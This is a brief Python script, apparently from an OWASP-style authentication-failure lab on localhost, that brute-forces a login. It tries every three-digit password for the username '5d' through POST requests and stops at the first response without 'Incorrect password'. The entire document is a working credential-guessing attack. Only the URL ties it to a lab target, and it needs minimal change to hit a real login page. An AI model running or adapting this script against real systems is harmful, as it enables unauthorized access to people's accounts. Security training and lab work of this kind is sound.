import requests
characters = ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9"]
for a in characters:
  for b in characters:
    for c in characters:
      temp = requests.post('http://localhost/A07-authenticationFailure/login.php', data={'username': '5d', 'password': a+b+c})
      if "Incorrect password" not in temp.text:
        print('Possible password: '+a+b+c)
        exit()